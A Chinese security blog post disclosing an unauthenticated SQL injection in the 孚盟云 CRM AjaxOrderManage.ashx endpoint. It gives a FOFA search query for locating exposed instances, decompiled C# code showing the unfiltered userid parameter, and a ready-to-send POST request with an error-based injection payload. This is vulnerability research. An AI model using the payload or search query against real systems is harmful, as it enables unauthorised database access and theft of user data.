---
title: "孚盟云CRM AjaxOrderManage.ashx SQL注入漏洞"
source: https://mrxn.net/jswz/fumacrm-Dingding-Ajax-AjaxOrderManage-sqli.html
asset_dir: assets/孚盟云crm-ajaxordermanage.ashx-sql注入漏洞
---

# 孚盟云CRM AjaxOrderManage.ashx SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2026/1/22 08:31
- 267浏览
- [0评论](#comment)
- 19分钟阅读

深入探索

网络安全会议

Windows安全工具

恶意软件分析工具

---

# 漏洞简介

上海孚盟[软件](#)有限公司是一家专业的外贸SaaS服务和行业解决方案提供商。其旗下产品孚盟云AjaxOrderManage.ashx接口存在多个[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞，未经身份验证的远程攻击者除了可以利用 SQL注入漏洞获取数据库中的信息(例如，管理员后台密码、站点的用户个人信息)之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

SQL注入检测工具

# 影响版本

# fofa语法

> app="孚盟软件-孚盟云"

# 漏洞分析

深入探索

授权

Web安全课程

物流软件安全

直接看 `AjaxOrderManage.ashx` 对应的dll文件 `FumaCRM_BS.NewWeb.dll` 里有关 **AjaxOrderManage** 方法的实现如下

```
public void ProcessRequest(HttpContext context)
{
  new SqlAndHtmlChecker(context.Request, context.Response).Check();
  context.Response.ContentType = "text/plain";
  string str1 = UserCookie.GetCookieValue("empId");
  if (!string.IsNullOrEmpty(str1))
    str1 = FumaCRM_BS.Utility.Encrypt.Encrypt.DesDecrypt(str1);
  string str2 = context.Request["action"];
  if (!string.op_Equality(str2, "getsalesfunnel"))
  {
    if (!string.op_Equality(str2, "clickEmp"))
    {
      if (!string.op_Equality(str2, "getfunnel"))
      {
        if (!string.op_Equality(str2, "getCustomerTop"))
        {
          if (!string.op_Equality(str2, "getCustomerFenbu"))
          {
            if (!string.op_Equality(str2, "getEmpxiashu"))
              return;
            this.getEmpxiashu(context, str1);
          }
          else
            this.getCustomerFenbu(context, str1);
        }
        else
          this.getCustomerTop(context, str1);
      }
      else
        this.getfunnel(context, str1);
    }
    else
      this.clickEmp(context, str1);
  }
  else if (context.Request["userid"] != null && string.op_Inequality(context.Request["userid"].ToString(), ""))
    this.getsalesfunnel(context, context.Request["userid"]);
  else
    this.getsalesfunnel(context, str1);
}
```

当**action=getsalesfunnel**时，进入`getsalesfunnel`方法

[![孚盟云CRM AjaxOrderManage.ashx SQL注入漏洞](images/img-001-75684cefc82b.webp)](https://image.mrxn.net/a7575648512e4e9099279e5bbf4e38c0.webp)

参数**userid**被直接拼接进SQL语句中执行，期间无过滤或校验，从而造成[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞。

action=clickEmp

代码安全审计

[![孚盟云CRM AjaxOrderManage.ashx SQL注入漏洞](images/img-002-ed1058c9686b.webp)](https://image.mrxn.net/013a646c81724f57901febcd8fb54bee.webp)

# 漏洞复现

```
POST /m/Dingding/Ajax/AjaxOrderManage.ashx HTTP/1.1
Host: fumacrm.mrxn.net
Cookie: UserCookie={"empId":"1"}
Content-Type: application/x-www-form-urlencoded

action=getsalesfunnel&userid='-1/user--
```

[![孚盟云CRM AjaxOrderManage.ashx SQL注入漏洞](images/img-003-cc20f6efc8b6.webp)](https://image.mrxn.net/50ca04cb2a50418b831f549c092b3e9e.webp)

成功通过报错注入在响应回显数数据库用户信息

漏洞扫描服务

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#0day](https://mrxn.net/tag/0day)
- [#asp.net](https://mrxn.net/tag/asp.net)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
